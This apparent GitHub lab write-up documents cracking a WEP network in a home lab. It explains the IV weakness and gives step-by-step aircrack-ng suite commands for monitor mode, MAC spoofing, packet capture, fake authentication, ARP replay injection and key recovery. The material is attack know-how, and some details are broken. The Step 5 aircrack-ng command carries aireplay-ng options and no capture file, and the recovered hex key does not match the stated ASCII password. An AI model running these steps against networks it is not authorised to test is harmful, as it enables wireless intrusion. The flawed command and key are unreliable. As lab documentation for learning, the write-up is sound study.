# WEP Cracking

### Objective
This task demonstrates the weaknesses of WEP wireless security in an authorised home lab environment. This project documents the setup, packet capture process, key recovery, essential findings, and lessons learned about why WEP is considered insecure.

### How WEP Encryption Works

- WEP uses the RC4 encryption algorithm to encrypt wireless traffic.

- For every packet, WEP combines:
  24-bit Initialization Vector (IV) + Shared WEP Key --> generates RC4 Keystream --> which is then used to Encrypt Wireless Packet.

- The Initialization Vector (IV) is transmitted in plaintext so that the receiving device can decrypt the packet.
  WEP uses a small 24-bit IV, and uses a different IV to encrypt every packet, the same IVs eventually repeat. Capturing enough packets with repeated or weak IVs allows statistical analysis to be used to recover the shared WEP key.
  This design weakness is one of the main reasons WEP is no longer considered secure.

 ### Skills Learned
- Understanding VMware virtualization process
- understanding Vmware Network Adapter settings: NAT, Bridged, Host-only
- Troubleshooting wireless adapter: (Host Machine and multi-VM connectivity issues)
- Configuring an external wireless adapter in monitor mode 
- Identifying nearby wireless networks and their security settings
- Getting familiar with several comamnd-line tools, like : airmon-ng, airodump-ng, aireplay-ng, aircrack-ng
- Understanding how WEP encryption and IV reuse create security weaknesses
- Recovering a WEP key from captured packets using aircrack-ng
- Documenting the lab setup, commands, results, and key findings
- Understanding why WEP is obsolete and should be replaced with WPA2 or WPA3

### Tools and Environment

 - VMware Workstation Pro – Used to run and manage the virtual machines.
 - Kali Linux VM – Used as the wireless security testing machine.
 - Windows 10 VM – Used as the client device connected to the test wireless network.
 - Realtek USB Wireless Adapter – Used for monitor mode, packet capture, and packet injection.
 - TP-Link Router – Configured as the authorised WEP test network.
 - Aircrack-ng Suite – Used to monitor, capture, generate, and analyse wireless traffic.
     - airmon-ng – Enabled monitor mode on the wireless adapter.
     - airodump-ng – Captured wireless packets and IVs.
     - aireplay-ng – Generated traffic and performed packet injection.
     - aircrack-ng – Analysed the captured IVs and recovered the WEP
       
### Key Learnings
- How to change the MAC address of my external Wifi Adapter:
   - Commands used:
      - ifconfig wlan0 down
      - ifconfig wlan0 hw ether 00:11:22:33:44:55
      - <img width="580" height="203" alt="image" src="https://github.com/user-attachments/assets/8426a2d5-1474-407c-8d00-9c40b63ba684" />

      - The MAC address of my enternal wireless adapter has been changed successfully. This technique may be useful in more advanced wireless security assessments.
    








### Project Workflow
- ##### Step 1: Enable Monitor Mode for the wireless Adapter:
   - iwconfig ; this will display the default mode of the wireless adapter
     - <img width="463" height="84" alt="image" src="https://github.com/user-attachments/assets/732e8ac0-6b57-4c35-abc5-384e274513cd" />
   - Now, to change the Mode=Monitor:
      - ifconfig wlan0 down ; disable the wlan0 interface
      - airmon-ng check kill ; kill any process that might block the Monitor Mode
      - iwconfig wlan0 mode monitor ; activating monitor mode
      - airmon-ng start wlan0 ; enable the wlan0 interface
      - iwconfig ; now, wlan0 should have mode=monitor
          - <img width="516" height="95" alt="image" src="https://github.com/user-attachments/assets/cbae5319-ee3b-444e-943a-80f162efd57b" />

      - ###### Note: Not all wireless adapter supports monitor mode. We need to buy the ones that support monitor mode.
    
 - ##### Step 2: Identify the Authorised WEP Network:

   - ###### The configuration on my Router for this activity:
      - <img width="320" height="101" alt="image" src="https://github.com/user-attachments/assets/c4dc4bef-2b10-4678-87cb-bce785e60af5" />
  - The tools/commands used are:
      - airodump-ng wlan0 ; I will get information about all the 2.4GHz band network
      - airodump-ng --band abg wlan0 ; now, we will see information about both 2.4 & 5GHz band wireless network within our range. But the search will be slow as our Adapter is capturing both the bands network.
      - ###### Note: All Wireless adapter does not support 5GHz band network. We need to buy the ones that support 5GHz to capture its packets.
      - The following information were recorded on the Target Network:
        
| Information | Lab Value |
|-------------|-----------|
| BSSID | xx:xx:xx:xx:xx:xx |
|PWR | -50 |
| Channel | 11 |
| ENC | WEP |
| ESSID | Test_Network |
| Beacons | 21 |
| #Data | 4 |

   - BSSID:	Router/access point MAC address
   - PWR:	Received Wi-Fi signal strength
   - Channel:	Wireless channel in use
   - Encryption(ENC):	Network security protocol
   - ESSID:	Wi-Fi network name
   - Beacons: Network announcement frames captured
   - #Data: number of useful packets that can be used to crack WEP. More the packets, more likely we will be able crack the WEP network

- ##### Step 3: Capture Wireless Packets:
    - airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel 11 --write test1 wlan0 ; capture information about the specific network device on the particular channel and write all captured data on a file named test1
    - Now, we will see list of the devices connected to the target router.
    - Several files are created by airodump-ng: .csv, .kismet.netxml, .cap, .kismet.csv and 01 is append to all the files, e.g. test-01.cap
- ##### Step 4: Generate Dummy Traffic for capturing larger number of useful packets when the network is not busy:
     -  To generate more traffic in the network we need to carry out Fake Authentication Attack. For this, we need to associate with the target router. Associating does not mean connecting to the router. We just want to let the router know that I am a device in the network and I want to communicate with you.
     -  aireplay-ng --fakeauth 0 -a xx:xx:xx:xx:xx:xx -h 00:11:22:33:44:55 wlan0 ; -a=MAC of target Router, -h=MAC of my wireless adapter
  - Now, we need to capture an ARP packet from the network. The purpose is to capture a legitimate ARP packet in the network and send that ARP packet repeatedly to the router. The router will generate new IV to encrypt every reply packet that it sends back to my wireless adapter.
     -  aireplay-ng --arpreplay -b xx:xx:xx:xx:xx:xx -h 00:11:22:33:44:55 wlan0 ; Running the ARP replay attack which will replay the captured ARP packets to the target router to generate additional IVs.
     -  Now, we I notice that the #Data=28657 and increasing.
- ##### Step 5: Perform Statistical Analysis Attack on the captured packets:
      - aircrack-ng --arpreplay -b xx:xx:xx:xx:xx:xx -h 00:11:22:33:44:55 wlan0 , aircrack-ng will run a statiscal analysis attack on the captured packets stored inside the test1-01.cap file.
  - <img width="456" height="79" alt="image" src="https://github.com/user-attachments/assets/9f81f32f-6b38-4da7-a54e-783ad70597b6" />

      - The HEX data = 70:61:73:73:77:6F:72:64:31:32, so, the WiFi Password would be = 70617373776F72643132
      - The ASCII data = testPassword!
   
- ### Final result 
| Test | Outcome |
|---|---|
| External adapter detected by Kali Linux | Successful |
| Monitor mode enabled | Successful |
| Authorised WEP network identified | Successful |
| Wireless packets captured | Successful |
| Packet injection tested | Successful |
| Sufficient IVs collected | Successful |
| WEP key recovered | Successful |
| Recovered key verified | Successful |

   




     


  
